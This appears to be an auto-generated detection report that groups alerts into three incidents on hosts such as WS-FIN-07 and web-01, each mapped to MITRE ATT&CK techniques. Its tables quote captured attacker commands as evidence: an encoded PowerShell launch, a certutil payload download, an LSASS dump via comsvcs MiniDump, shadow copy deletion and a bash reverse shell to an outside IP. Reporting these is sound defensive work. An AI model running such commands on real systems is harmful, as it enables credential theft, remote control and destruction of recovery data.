# Detection Report

Scanned **18** events with **9** rules → **11** alerts in **3** incident(s).

🔴 critical: 2 · 🟠 high: 4 · 🟡 medium: 2 · 🔵 low: 3

## Incidents

### 1. 🔴 CRITICAL · `WS-FIN-07.corp.local` — **multi-stage, escalated**

- **Window:** 2026-11-16 09:12:09 → 09:29:05 UTC
- **Kill chain:** Initial Access → Execution → Persistence → Defense Evasion → Credential Access → Discovery → Command and Control → Impact
- **Techniques:** T1003.001, T1027, T1033, T1059.001, T1069.002, T1071, T1105, T1140, T1204.002, T1218.011, T1490, T1547.001, T1566.001

| Time | Level | Rule | Detail |
|---|---|---|---|
| 2026-11-16 09:12:09.204 | high | Office Application Spawning a Shell or Script Host | `cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA` |
| 2026-11-16 09:12:09.871 | high | Encoded PowerShell Command Line | `powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA` |
| 2026-11-16 09:12:31.055 | high | Certutil Used to Download or Decode a Payload | `certutil.exe -urlcache -split -f http://203.0.113.50/k.dll C:\Users\Public\k.dll` |
| 2026-11-16 09:12:47.002 | medium | Rundll32 Network Connection to a Public IP | `C:\Windows\System32\rundll32.exe → 198.51.100.23:443` |
| 2026-11-16 09:14:02.118 | low | Domain and Privilege Discovery Commands | `whoami /priv` |
| 2026-11-16 09:14:20.740 | low | Domain and Privilege Discovery Commands | `net group "Domain Admins" /domain` |
| 2026-11-16 09:16:33.389 | medium | Registry Run Key Persistence via reg.exe | `reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v OneDriveSync /d C:\Users\...` |
| 2026-11-16 09:21:48.913 | critical | LSASS Memory Dump via Comsvcs MiniDump or ProcDump | `rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 712 C:\Users\Public\l.dmp full` |
| 2026-11-16 09:29:05.276 | critical | Volume Shadow Copy Deletion | `vssadmin.exe Delete Shadows /All /Quiet` |

### 2. 🟠 HIGH · `web-01`

- **Window:** 2026-11-16 10:05:44 → 10:05:44 UTC
- **Kill chain:** Execution → Command and Control
- **Techniques:** T1059.004

| Time | Level | Rule | Detail |
|---|---|---|---|
| 2026-11-16 10:05:44.120 | high | Linux Reverse Shell One-Liner | `bash -c "bash -i >& /dev/tcp/203.0.113.9/4444 0>&1"` |

### 3. 🔵 LOW · `WS-IT-01.corp.local`

- **Window:** 2026-11-16 11:40:17 → 11:40:17 UTC
- **Kill chain:** Discovery
- **Techniques:** T1033, T1069.002

| Time | Level | Rule | Detail |
|---|---|---|---|
| 2026-11-16 11:40:17.008 | low | Domain and Privilege Discovery Commands | `whoami /groups` |
